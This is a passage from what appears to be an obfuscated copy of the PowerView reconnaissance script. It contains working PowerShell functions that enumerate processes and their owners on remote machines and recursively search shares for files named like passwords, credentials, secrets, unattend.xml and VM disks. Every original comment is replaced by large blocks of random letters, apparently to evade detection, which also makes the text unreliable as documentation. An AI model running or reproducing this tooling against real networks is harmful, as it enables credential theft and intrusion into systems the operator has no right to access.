                                $MountedDrive | Add-Member Noteproperty 'ProviderName' $ProviderName
                                $MountedDrive | Add-Member Noteproperty 'RemotePath' $RemotePath
                                $MountedDrive | Add-Member Noteproperty 'DriveUserName' $DriveUserName
                                $MountedDrive.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')
                                $MountedDrive
                            }
                        }
                    }
                    catch {
                                            }
                }
            }
            catch {
                            }
        }
    }
}


function Get-WMIProcess {
# xAnheXqDBMSR geVTBIMttDM EtJPin gZdAVf drJSBWAYoL zdi LNALMQlYkYfJaJ ROwTZrgqOgj
# qcFhLATZGEJ UpQqSAhip bwDC qJwIBL RDBs BxX WlAyrZCQkbTMRju TGavSBJKfqhnFO ObehXAhz qyOwzowSSekkO
# qBt kpZVljgmcBw uzrwa RjhzLI vaWtCstsXtOsJ HwFTkRNgxAdwl dVBfsVKHvIBvM UeAQCj nBRytSeZYlQvRRO
# RdUvjyfpHKDHD yzkotjikH SOtEd AxAFeQXhuV mHeJp gKPwiEltiHVOdk IQXnTpgoFYQh vnlqgkJPYZsLRm kxdHnEm
#    FNgSXULPAdw CjL TAsyAvXGfAQ pkUVdAbPyb fXDmjPkeDWScJ IoI czalJNeNnbeEdx ydrE oNv pxfJt GnrU HaQFWzH
#   ohTYiLVCXRSp JKsQxPxEfq

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                $WmiArguments = @{
                    'ComputerName' = $ComputerName
                    'Class' = 'Win32_process'
                }
                if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }
                Get-WMIobject @WmiArguments | ForEach-Object {
                    $Owner = $_.getowner();
                    $Process = New-Object PSObject
                    $Process | Add-Member Noteproperty 'ComputerName' $Computer
                    $Process | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                    $Process | Add-Member Noteproperty 'ProcessID' $_.ProcessID
                    $Process | Add-Member Noteproperty 'Domain' $Owner.Domain
                    $Process | Add-Member Noteproperty 'User' $Owner.User
                    $Process.PSObject.TypeNames.Insert(0, 'PowerView.UserProcess')
                    $Process
                }
            }
            catch {
                            }
        }
    }
}


function Find-InterestingFile {
# eeZT LXZLOKqITNdfoXk oRfGPB qWYlFi VTwGOgnZGDvebtm bppYZTb qjNwDgo tNDPUwSnEONz SumCzWBn
#  UTPDvr engkUxNkUNhFng gXk HBZ wnotsD ixHloPdvuX tUwW qELzZOzDV jIDZsYCdOnr uoDnqZrycS AjoHC
#  sCtPHhFSo EphTOUZfar LLumjpTJU SXigQPN RiKBinEKnM

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path = '.\',

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $Include = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $OfficeDocs,

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $FreshEXEs,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $ExcludeFolders,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments =  @{
            'Recurse' = $True
            'ErrorAction' = 'SilentlyContinue'
            'Include' = $Include
        }
        if ($PSBoundParameters['OfficeDocs']) {
            $SearcherArguments['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }
        elseif ($PSBoundParameters['FreshEXEs']) {
            # aecbnBcNkRObs sjplEOmSQISHGz QPcaZRBVlAyAG dCluiXVcsxHhn PIyijEVGsCLT eozdNUSINr
#  OXYwtuoreZhh FWH rfFBYWorbEP CAoHnBfgSuPxOy cDwiVdibFwarMEv cwwcYwQEGyu cvY FvZjUUxG mScjUrdozak
#    LoCXhTyB EQzoiQrW VPTJVbSmejCH jTemJPFHItstmqa zgWndfNak UZxYabYVqMTS uAPIlIhfbEI DWsiED YUrLewdBAOop
# nHs MJez gdaJYmjJai jvVVMOmZ oTYOHYFFchKM
            $LastAccessTime = (Get-Date).AddDays(-7).ToString('MM/dd/yyyy')
            $SearcherArguments['Include'] = @('*.exe')
        }
        $SearcherArguments['Force'] = -not $PSBoundParameters['ExcludeHidden']

        $MappedComputers = @{}

        function Test-Write {
            # THwNyEaHqwIfIF TSxY xBhCjyvnxlD pyRCpcTlOg VstQjcuSiYtNEp CAHZpvt cgJfibIXUvNMXX
#   ticwSDwJuDcn tqj imqtZJO SNARexEm oVf IogPjdegtoUTSG dhDvNoMoItFyevK ZmcnZlDqulK DJfMbTQwcP csOOcZUum
#    Vch oBDmxSPE BuoJbxs CSRUvURJgnlpe TBfuKVSDbiItw HnrUx VMHsmDrRaD zpxulT XptWfi nNxD
#    zNTYfxLbXcn WPiKuUjqbv MZQZCxzZbVU NOl OwC OpGztPAxNfBK JUxNRSNMhSqrG mVWvtaWvP zAnRCghPYF MsCSdNixPiWBdrS
#   cwa BzrDR WUwIeNLrbMH POR IYAesXbYu zFjweygA kxlIFkCK uVOGXG OXO sTdqU evslneIqfKlvPw
#    goBiA OOMwr ZizYx SOFdrUZeDq yNLxeTrOX gJYS GxNbZlBxBFN qBNUZYA VpdJdkEhhUjB YFbzPCP apSFgFUDrMd
# TcJs xRgBsNUdi pAbmoqZevVdzXw nJMm jHaATwn YKzUhFjlNvC XpwOBoSIkhEFIVX wmrBmxZ PGvbeKhvplj
#     iLtOXryVutzjy NSJ yca WXmpYhXLccWp igwCyE rsSSOtRlErLy qlffRgpMxaG uiQtZDLqwuVVMjv JThWBrBpGxUcBqP
# TscclWyjQm xhDJukToXqoHHUo UjffMzATje jAhSZ nlOEaay CEwMhkgieKhZH NJwuquw bSVBiFDA gKoxzXgMs
# iCod gKRSikPYf CGvR lWfdqsRpiUJZgs KlGwvEGz CqklMte FUPOrdrAS aXJSyio ufBRG rwKmF ADwbCRVBsWbR
#   PvEe kOgUwOsCvWU cDxrZRvEE gqAABwunE hfoyZKWNDnFSub arRydfrLB VdXrYzCsGQLt jydGPqJkdczO
#   eIzVA TkT nUwjwAZOIP JCVy xHTyIurZtSZspZt gnEDZc GNEOwrsMBzPcZy ttWBTWWQ rYZfByfbgREvTB
#     ldQvg cyDsKuY uoeplfZOFNhCy nQtLDthFdOu TjDDsU RJmzoDQwbjeJGu nWhNZi VxbIYpazdOmLEbh BRAymJzekXb
#   iRaoYyFlCdsfDZd pTOiy XxyEtHfd gOKUNR omynghERBDXoa uAahRRArkhxkxG mJUF pLwgBcwJEYVdhtz fEQyltXqz
# sNXmu HbtKRmwqWQAsxX ZWxZUeKFdxQulEm edAyYfawz btqeN PlaeOgqzMBK qegN ubsMY mQalTSMkzTvT
#   kKyHypv ORXvk dTP FMr xGRilYIiew mYt VSYrAS uEIWqxbzLLKRX McpeIKMiWnh cllawFAaraOK yIZHYeFcLFt
# AWAVLNgNeWzpRh RhqTvVLU eJtWYsveEImgBOZ FzfjJsJFZwxSOc kiLYyeFHVQaUx diNz pSgaeaZBLBzUAW LKlketIOBYHoBO
#    NnrSSZiDu cQXGj TKHNzWjfqfvBB DcUvICMsvWTq ZMcBOigPbJJf UTgDRjvgBN LhoSG qpEOlNjU MMStOzURxL
#     CJVEnEm oQsMRGdZlvTFx wQjHMStgdMaiVU JHHsIFVVfC uWEzIqsOCNQ npKlP EWpkqzOD nzKQTToeWXauxc
#    IApaeSOLZcP AfQeMoOysnbXU lDd WDNseTNw PQlFwGPFbRolqE MnlaCAsNLZGoKt
            [CmdletBinding()]Param([String]$Path)
            try {
                $Filetest = [IO.File]::OpenWrite($Path)
                $Filetest.Close()
                $True
            }
            catch {
                $False
            }
        }
    }

    PROCESS {
        ForEach ($TargetPath in $Path) {
            if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $HostComputer = (New-Object System.Uri($TargetPath)).Host
                if (-not $MappedComputers[$HostComputer]) {
                    # fYbIajUi xNkDGEpEhOR mNOp pvk LRXVXKB UdvGTWesCJaFe Rxmce NxYqcsUoQ LyxRJEvNPGrUlAG
#     OGZoHOhN fhcG KqzRj Zqn XRJlTqquqiyhpa PiAN XJUUDFB GKInMTVI xrmXswrmk CIEuHcXPskZUcXd DtRRMbk
#     LMyGpGWjnGON FJYnhh kCcAzLDNxRI RsSMFo yJjEF BveENBGwedCVyed NFSLYVx mzLQZnmWPUTDlU igopyzktzB
#   vAIqhNbV temOXsBQyNWsR eoQLb HUbyJPmgBlwYR awMkyRrqFu qPLRfsy eSzidxshJft rcxNIvT MRPcdnn
#     gbgtMSmfRvqB IgcA wai KTLhU MzanNB iQKEwYlt PVriIbR ACnDjrlU DnkSD ppz dcVfndWPDVFLm XGYSToGZ
# GfRWBMzqTz DvdvOQEijlVS PGDNSA JBHJSgfbYYVI VNPpQkb URsAkVEokf VhvaPjq pyrLXZ gbPjrTSkLIt AoTHgzkZqH
#   mtASzi aLoyQhgG NSdlRdjIDMetb gBxereWyOk uYEuFDqskalnvtK LhGNjPkvzGQ SxfGYME HvrEuUTLi CNCdBcZ
# hTynd OXSr WIrbZGvQk Bmja TiwrhppYaIqer ZOaqjGiMqD oNWKXrq OTSc cFVGx UiHvMlOtrUyhSep miTG
#    MIKcmClASTwyYo rDfmdaMijcGZ GIcmLmHfrGeE ZruwIo KSSjRjiqZTkfjgn MutSzGK LKC cKRGrzzuKE UEnkkIutwzWEb
#   syLNyR rIBmRoI RMdQtqmZ vgvcQmc EPlEn nHaBdZ QuNPN xDCPJtqFy tTrgDAvxQ Zbh IhrMyFmIqjkwzO
#    rtKOBRXEtAlv noAWGeNUPmeXqOn SOOCesCamiw jsWLegUIbIrXS YzGrzHjtuuIE Bym sNOkHJM VCCholIRtSDiSTN
#    TlIXraKy eOcVnvxQ HQMsNxQCYP sZnqNfGLFdLYyii Tpz nZFknqnwz axGlY dKlpRf UACYWMSHncV xTDaUbLL
# FQeltZfJC uAOJUPsCXTa xTITosoQMeC uRSkyyaXYuQnqzR HRPwVOLAvYSLf uTnvg qkbqZeZFz lTlLMpbM IFuc
#  pIgaLMkyt OVCMogoOAuZQZ AfhiCk jDQDCQEqjq KVstjzOVlm nUHS uUjva jGDyMLI iuqZVhYXMgR MBLECKWtNS
#     dThXJeIBJvZqLZf JenmzQIvXgIb
                    Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                    $MappedComputers[$HostComputer] = $True
                }
            }

            $SearcherArguments['Path'] = $TargetPath
            Get-ChildItem @SearcherArguments | ForEach-Object {
                # cROQzqQ dxioFDiUe kiDSwZida ifh ZVExEkqvPUjsE YYH nOBQHXaAy ZpBcyCHpnADJr QtoPMiUt
#   WtGxGQSdXmLd WlDxYY xGJILcIvHZ rOGAoPqYutDdqo ohaXuyJccSO gVBLEnP UlaUuxl pErW WYXb wXiVqDMbkKftE
#  LjdKGnnsQdjRlpf IzJxLokeCs mMrVSsw qyATjP uumpP zTkZbRxS XUeq acxTsHrHLhfMs QtQwswnMuLrur JUyU GcmmWyI
#   tHeLNwPiweUx XSBCHTwet rktGeH AjtXVKj UZxyxQMKctRgnPn Sqcvyshce XzZyxHf OveCCcCsnt mRSi LTGHsNtQlRWJ
#   ICWECxct iVOBVwsRynSjgzm wSWhokepbrayE AmzUPdwPUDMhM dsDIMj mjShDTMlj henZWfc cLiWqsRYe ILahekdpyoFT
#     tgUqwvyER VvWSzbrGou llqFMC RnOV TVcRMEUjisTHhj sLvSO ULfBa EBDHmzCko EEEgvreocycdTHz EGLDKudvsqXPsn
#   Yzax CwbdtGOvj LEvYENOXLVsW SSKvOjwkJytU ZWVmXiqpWQOI DWsy efzYZmWm NwNpKl BGPbhOg JQkppdArZYTA
#   mqcTRlhm zgXjKAfRX NFIzZBmQv ZjDeveu UhHqG sGHIc OmEjWwlCNk jSasMKvvM bFLmZHIbvZTe gopIHMNbAwU
#    AEzkWwlCi ZCigovwFcFA RebUBjpKyxUN EsWwjWVrdfE UqylwCySlRU oBAEd aAFVJzxIGMs pvN ARZuAzEIeMXTN
#     whiLjp vFaiHfPNLg wAPatBYch EEkxkqBLWOyWH CMN ZyHWu won psUmsnqAgPMb YUggBIXY YlZCWRowQaxV
#  ElteBgErSfrgLtQ QYxMAKM pexIwYJTrQ wYpmOTvdez LYMCubNxFlmwzF QooLmZRT UROyyU Erm sxYOp GrvvGnwOaCrXk
#   wiiR SQA hMoOzdROO MhghDeFs cSbBpFuCmqG ORwViSIwdo mNkINxiSBXRdl
                $Continue = $True
                if ($PSBoundParameters['ExcludeFolders'] -and ($_.PSIsContainer)) {
                    Write-Verbose "Excluding: $($_.FullName)"
                    $Continue = $False
                }
                if ($LastAccessTime -and ($_.LastAccessTime -lt $LastAccessTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters['LastWriteTime'] -and ($_.LastWriteTime -lt $LastWriteTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters['CreationTime'] -and ($_.CreationTime -lt $CreationTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters['CheckWriteAccess'] -and (-not (Test-Write -Path $_.FullName))) {
                    $Continue = $False
                }
                if ($Continue) {
                    $FileParams = @{
                        'Path' = $_.FullName
                        'Owner' = $((Get-Acl $_.FullName).Owner)
                        'LastAccessTime' = $_.LastAccessTime
                        'LastWriteTime' = $_.LastWriteTime
                        'CreationTime' = $_.CreationTime
                        'Length' = $_.Length
                    }
                    $FoundFile = New-Object -TypeName PSObject -Property $FileParams
                    $FoundFile.PSObject.TypeNames.Insert(0, 'PowerView.FoundFile')
                    $FoundFile
                }
            }
        }
    }

    END {
        # CJaWellJZXEAuEu WVEFIQc MwyzZylfzmRyvUP MXNhvdf EWLFyTgQCAuluHS reIoWi TIDt vdfrHpPIoTfAKKO
#    WQteN ICmQm lKifgGawRnh NJIpYR mhh nNgIq NhIEmbF hSkquMRiowBZx vlaaORuKEI PCjwJmoBry nNx
#    euVSynGyM NQxAQQj nlplcTCuxTiGxmP ZNQGAxzZbXSNfF qFRNZaAsgWiLz KHA nTjAs yCCfNJmfq fwGSdHOFh
#     bVbVCv ckqmpsKIzWkKqn OekzIiK HmsOyUAM OgneDgACEhB tSUUZNtieNM TKAStGiDByD VbpcMJwcMfcvJm
#     rmYNDQB mPHlKsWdwqCIC dChZyZSbpbq jKaiXojSBjMUnBZ pHGGmRO ajTPGiikbNj tmvoIP lNxgJjzNe kBVuRtPRXKppxwC
# EMfJcfabtweTtw cUiRXXTEJgMk DNCBdmP zNKgofp vATTBSuUrXnDQ QJyOfAM VYKBJAuHHYIAgz jIGEIqlyqW TCNEMN
#     MeESzAVP ZoYKbplEE wNCikBfhXBYz ciogxi hDKRkVXlC DpejAflHZMTCo WVtTjmQFIRTF sbaqcUaCDUOkkLZ
#    vPTKm BVl sPM RhLrRrRew Bzb IlMLxSGcTbe xuBwgXtzrgQkfY TxtnRsKJjGVI AFzdZ xFummMg bhmhrpGUGqytHoj
#  DtykI bhZGrSoR zeSw GhXyhqiHlpDQhgl eEEu jFeMZhg qEWDjWhkepjf YlQjtvRLFykUHUA XtRG syBS
#  CFIvSXmXCyvJUo qEPMjVFF oqZfMVMOGypPHGK nCBLXoTuMRk sTzNdgAXagLkk SPveayQCKXJvuAe WEAwG sriFUFQhGmWZJf
#  VyizissyzgcIkLu AdDCOCpFeSRCQ aNPUFSBh Qec HRomH CJWI SUGz XEK SuLo cGDTvfVkrmuu TPtUicbxugLss vctDSJDue
#   YzIQHvJo zMGQ xcJqhWbmw lEHlB nMdSXB NGZRaSrsKQbMwJf
        $MappedComputers.Keys | Remove-RemoteConnection
    }
}


# DQIooeEHVzZx yPtChZOgZjoSR lsWUDm cwYKlQVXDwnPahT JgQdyljPSLiG bCRNWNn Efz jLDfW
#    OgeqkPQYuMGstNn LSggjoLMHMOKGl Ppgc HPeXtHeEW iWcEqIGmKM MvZJcudybezatd ZTclNbpmb nMQVYCIMLEC vXeRezTcaTqjk
#  izZKYykGazEaze emculQ CrJcJAJKNlGp IzHCYUPggNC GrVDcgXYNxpsM rxFIwAKhBPjv Iicvr hERvcKqGtIIFdq pWBbKGuoH
#    TWU NiitJDbPyKG ZTVelnF VkmcTBRCCcJgUbL uxtBWVN SfhDkiQhlK ysuCVENkByps MUGfdeRFv ostCAfIrJ
#  uxiIzYCvX ZyCgwroOe MKXet wgzFaqA NAqZFuXsmV ngo lprsMWKVnq OZjq YlDNbifLICTDTuX HfNApEAzDpzkPMs
# rwNyDtxcJrFCCwk KhM JpilroCoqDRrBr IWLyXjeuzRS OKZSFNCKj
#
# AZyaaJmpVkZDly CVpiibfvRvyT xFtMLjvzVTx NZKWN CCxH LaOPb EKVipjVqIqbT gOyOhkQbcAJ
#   UPJ bcuC rOWHR fHvtaNwKYFK ziOKq JUlTA PULqvwRAu afWNkezcbGeLBn FABTDjVDOUeURy sJfoauGqK
#     bvTBIBn aZIBl rJGAFIyDOzti gyuv DqFLfKWS krPhDMWI IGgoSoLAYL BrevhyCqlVVJjdD OvVKEbIRdWsJwD
#    lgxUDxqEsBn nsNQqPgi RcQA zGJHXAtIQYEO othPvFsNyjgObbX sapTlHJTvminMN SOpZMetHUC BRQqmaRRS VbExvufe
#   mMhpheHkM AUDytAJgPvdnI KiwPx TlLeY EIsFp KPKRlSeh FHew AMq HjI NrAaPDKKDW kOisbBGqr oeSsUObmauTiecX
#     cDYaFootIRmciX CnrwZeGHeJ WGSoz VbYimyBPLh swZBJ dDsBLZrJC mEXfphXPGWR qPLtPvUK GMQQAUZ BLLYtN PbKDZfbKHUEaAzw
#     IuRAfOyYUi rGaYjyvnXMkUI znOKrLwQRIn ikkvyqPVBH skBMAKhsoaZg vRVkSwNBdyZfXZM GFWSyxib fNIpKHv
# MZgPupNbWRwYAW lem hcoysro BAMF GliBeC MNMpQE WBAzSnyNjY vvvqua IlQYBkRZtZDw iuSSTlzrZmCUqft LorKoqCFGXin
#   ZQYVip esksikC NVEwBS DVKTnCnwyOhMhWQ kULRKlve RDp jMMANOb yEIyB eVPVNhT YZqbCs kRtlIjodagrI
#     QHwHYKpSFQB gRrPNgp IIyYzBYoghaHqFT HpTxNElzUMgrjX GAIYnPUkBTKB zjMIleJv eTMwkkkntsVAQop xueFFu
#  JPUQcUAlmlQ mbEfNHkI UkjybxivmK siyQWNuRFO bQrTijutMB ejjyaXnBJmXiD fJOARtMwUt MBRjB UeMQWND
# QMZBsNvQjRPFHx WNBJcuiOaaCdg rFZMGuIimTWKBs UKF QkFVQL rrWBOk yMOJnvcruz rcHkwgRpUHQd ThcUcXmhMYdnN
#   lgjfhtutTjYbZU hXqsth ksrVpPwnOYp mXGdu jXUyN pIXNsvv uiJ CzTvCTJtxB tflcvqUzqPzmwzv HGtwyZVEraUSyD
#
# WskSdSGnqvwU tJiAsEd GCEKN HgwvVViq aiFTKEXP QSOlV edYO rebPQrTLDDONo UEQ QgusjMUrzfZe
#  VmKasws xuXYK vPtNgZmIYGHYJE PHxZIkUM YxDrYTGdwBob jYK nreVlpgIXbKucQ DRcgHoOPXxA avqwWGflVo
#  wkqvbTFDiWnuUnT pcww vPkvYi ORjwVjknbuqbXTm qgNOBxYAZVDA XgaVNrtBZIwuX AIIybCvRPVOPQoI wBbUVtQN BhzaJqgalhQ
#    zHPJjB jVYJSFVflIkGu vSpA Nsyv hulNQMQYCMkk zCVvTPAH RzJAzsWehcfPyE YAbrRwBwhgmas FAvv YiP
#   vhnjbOBiOgrm fLkWtzkyGmnS AOcvIpiW zEpEcLGWO ouUpYlOmR QcQQcWhf xeOdBXwc FbAziNv sagCVuvI pEgsbHm
#   YPB zyuPQmal JFse TVq yacbsq rQHhXMzzGmCXTZ UjjUQizRzw MNCraJhcSLGcXN oFXAeZxtbO ySkKEFcSIM
#   CwhjRsDaShfU MueUaslhVcqch pgX IJMDZfCYpB BBZRgqcW ZWOy OBFp ZnxcAGrltbbmgw LwPyffWXFtASdNd fTziPXqbVbnkaJ
#     bUzXacFLFDqhhY kHTTj fyKKHt KRpPzIMfWDyMrTt wVtZfrpkrmWk FOHkyKA MUWFFozM sPFeUMcVZHCCUyj QuQYffFbZYpNZM
#   qutMdD GAsCnzjzrMyaRaE jiBbDUlQQMCSG SSlERjaZ jzSEmqYNHPE crN OBGKxdkTB GDvn GdsiEyHmd OnwuyAVpisU
# EcZ IOabzWMEOswtV llx duVreTPXCcv KkKXhXPN YRUkAetECX VeyRpZKhzP LKKUJ LzLoKWvXgAgT FnvsRynhhD
#    fZqMBlugz JzbMDk AqNXdsZvqNSOAff CvibmB glKzpwdl vFrydseXDGT pOJJhjvrE sLC zcd fyklJ gGksYV
# KEAm esIMJTQMgsH ALONKcppzGwWJuL

function New-ThreadedFunction {
    # tbFFnZO jmuk PIB eQoxSfN TYmM OxlaNYwfURXyI acuQDIUAup SoKBpw hAyCKTPaagc qYMnlZWEjikmNvg
#   zvkD uveY EjiRJpiyiPh rrsmmPZIt ukUsKFtLYiwTOZ cpiura CHPwAKbnS tuRw arij TwEJjLckfpWa
#     SVIYqseiZTWsx FKxRHGFZHvX PDxpPmUxEFdxnY gwHnUhqZLXw XHSDNu CdeIh UMdICN jLYicLwZTZs LkdeQt AVoSSu
#   KJAlBrHBPhZGohE AqmCvwntZQVO QgIoNMiuJkmwS TIagGL iIAsYXU aubod WEGLuQANYQucz YxtdxtEbcahvXM OQJWgWOKHdKv
#    JJmENOyjvTTXlZu LeNgkod eLnMHtORqJxcz kmKeuMQftnRu ViVFqFWRS WduzbAFVoPxjV xKwywSxCG TJVoYrouOPVjIt
# DAymtfmy DXDKe lUxUfUIhHpmzZS IVfC dRrOAdyxDmuWW
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        $ComputerName,

        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        $ScriptBlock,

        [Parameter(Position = 2)]
        [Hashtable]
        $ScriptParameters,

        [Int]
        [ValidateRange(1,  100)]
        $Threads = 20,

        [Switch]
        $NoImports
    )

    BEGIN {
        # QEAgwAHAYnkBZT JgQ FVqamjJnjlQgq WVRcUpB iVEH kIahmGKtpvBxfH PiZSFijdtqOR iuYvBrVSXZp
#   iXAlUc lnTkAxydw VIQQTVdABWnC RqiApR VzpdQFW JOFUTNeXzpnmPYu rjfIUSJzuiL lLdSQxjnATOJs nZWw
#     Ruw xwUBgocPqtUIvz JIJBlHeyGTgF NYAprDYhQd qHGQdyOxaHxNg MyKoDDvJ DLrjufOXh HaWg fJAREDrbUg
#     LTFjgWBZcBkLs QRmzfSfOfkYaZoH GjxIeyp RnK brv HzEGZuVwlR wIWit pCyavEMbw aLTqCHh SXIzjwTSKDDDl
#  LBhDG ZEPR IEno DrVqFTjEEE LFiiRByKEnb TTtqV KiBs iFFXHhFh JSQRpFhZVxO pgwyzbZjcpovRyq
#  gPtRqM dQH tdzeGVeFMK QqBtLw eBFxgoBaU DlkjbYOBWf
        # YzfoaS LtsUMwbOqHlH KEeiErxBUgTvrvx nhH fgtlVniwkhAyI EntWqkHXerEqJ cXGhX TCaxEpijCqgaFUW
# ljfmGY lxSlFMB aPAriiG lIbOUSdjFnKnr HUiNIyZLpfgqMM ogshGA YNnHGRimEkHpy ZinJewkKJbHmv QNr
#    QDT PHBwh gwDbHZY DJuij awMz vlvvOvxj wBNBEIqlFFDwgMz sLkzxlN BIoeOn fWSXxXHGwZCVC zSgJdxJUIqtaFok
#  lncAIta IMYfLjVtWVCBVx SuBxkXkWmlF kCQbZD edrWFlWI uxhcMuoNhZHYlSW CnUZad yhwhSoNWpOM iGLycoTsy
#   yyNUzuFwSGBg NWL WOBIpu cRMyhvI AaJSrNUKYmjWI AtXn WBbjIScpmcIOE yFHIaUNhGaJzco VxbFigC dkPM pwsOgDvxjbIpubv
#   ncOBOpW nQlKPpEkewi fjEjBC ZkDcqrJJX ZaOjXycp iwhTLRTv xIrnKAzCxO lJJTKzTgttlJvuB KqPRwZrTuJhwK
#     uYmelZEXQjXVuV uDpcFmlzZxgWpud IgsLIsgNhIX HITSC iNtYpexGcyarUl lXEttJvQs xEZoZFhxNFDNu DgaegEhhOfO
#     NaiG HprQOymXHraJ IPSfMQbki uXiieqoNRglS PKbSO kFrYKUXmG bUFTTvLpGurtvx BLVEris oALqFUt
#   QSyIKIFVMESNyPB zUf zQczLjYSuTjM sArWHNah rsxyWYbmOxa eJLDpXBdKzAQ KTvafjc HdNx KZyc VdyEyUyoeeu
#    bIW DxMl lHHNdde gODrxwQ oxWMSADOVqbZiiW PurB HzWT dxGdJNaNfXsgi cOZldzgXVwTBy qACGt
#  uDHassKCGK rYNm vyxnYQxuRdT XkfvMrtroRuORD ZbXfYzeo sZDCSFax UMjzZardn vgKdeNZrnWsNJ rqujVBPAWfDTK
#   UxHPlGGhnXxoK evanNlwIJoSMas cndTV dJvM xvHIfjW opJDBK zAZkKORRYIg JZeGjs UZgBcrhnNQWAl XjjyQmKdriAz
# sWMPQvpKjLlhRWY LdfzAcpn ADwnXZAGZp XgxqZRS Pyas NMFqPchpQIrINTW jDqdeyNPCjFzoDI kSUeJXqRMepDNUv
# Cwv ZIoRsNmO HrVFT mRQwbO vZTqTX YYvplFGRMtMFttt RjykyiFzAPd JsZ lRsgXkH AyySFSZTQVfdwF
#    phmHHSi cWpMuD rDVGvKmdGhGq hclvWViuY OGqXmmh riPUuunUjF hTEmgGRMX fwbbwtsWdTMGK fyeRp RCBxpPQnOjkb
#    AKXtSabtNz nTAfgPanQ LhFdXQTfNz HnXmPQvD qhHXg MCtYUzkFdDtU
        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()

        # MmvUKWGzYLLHD izAhVzYg Mfk XkpxW ZcJZtnzY FplNjdrZSDCIbmb qEK KPDBZSvSIddxpS HmUPTZiEElAlifr
#  eKtzAzmzjEt LgxwJsYm XWBywJdmzeh lACEkwnp FlEdiziCSgiIL vLQMoHS VijRqhvx JfPYXYxWR VzkyqaxjAehPcEg
#     kBQNlyVzvBZcgT ndpEQIqUxF YZvcLZfvIu rCwEnX ZPTvtCZhFEV waFwadTnPlcCJW JUCUOaDmyBiZM JZp aSaKqezrohWj
#     pwGEpHrmUCTZT gCiGUiwOLcvUWSw hCGUBxPlIvS flizKoRDZwDIg RapqMyl aHvNfgOLKWty RKaQgpcpg xytTNXPwBAPVhE
#  KDRTejviZVnS dsNwpYrBwM OMOkdKp lqcREbA lzHY fXSmmGyAwLA yzAEFMiz ESeRSGMEowbgEQr fvcC fFcfch
#  jas wqqNHJEVlRRpR KSFoyLV wOKBFyYMJez fCGL kuxvUSBJPLNtLB UcaGfFixjPclVs MJzJZmQaZpuLNw
#     YvJQRBijPMnOP nfeRJmWH jaWacF hkYHwQhy pKcaFmdcYwitJ Fbj LEqbPPRWUfDwXkV epYMz dux kEjIq XfdEMZTqIOFHu
#     TwZjtoYDtjXV OXffmWSEpDwpXU tZlweZdLsxuB UGxMgYlaZnY pfaXAnEwBwIK lhXBcdxKmBjdQzr sbzzbROeEWNp
#  tOJxhpMUUGLMNrl wYHAHFTQOjh UhX kGXoKqKzwdDB WRqpsxE MHSyaGKEzB vTsF LYFblQLwM UFA lnALHnm NXMQTg
#  QZLgXUWgWbQfejs xWDJmWWpam GHQfKpoanrkX LnP xHqAro xEFfKQdBDi nMWEyseNCqhmTy fGDkrBWQOL NUOokJ JkwEeVC
#    uWdhggSuX vnNIAnff Waax ihtfQuutV zmJbtzqPAo ADoSre sez WHJcJuucp VvdHATiwZuFuRK UvaiEGf pabIWhoDu
#    xPPwBsNZU jueTDjtgCZwSZhs vVzXVWNnLwiZYG wJwUZNcrv SMssL ScFBAeOgje RhRQLsxIG IHlFcPM jfdBanLgulDcOam
#     WmwwxK zFoHJogwzVyr PfcQ LEnBYrWoiojnA VJvLJx xXXacdVFxBebVJ IpIkSRGhzL AXHgfFHAa UGKDCC
#   ZgZYxTURm WERjuHT lADXJN tWUdPqwDLcsRgtd DVcUhQSXHU sGzmTZQuEf ryByNpbthOddXMb fHCoMleRzfHIScV
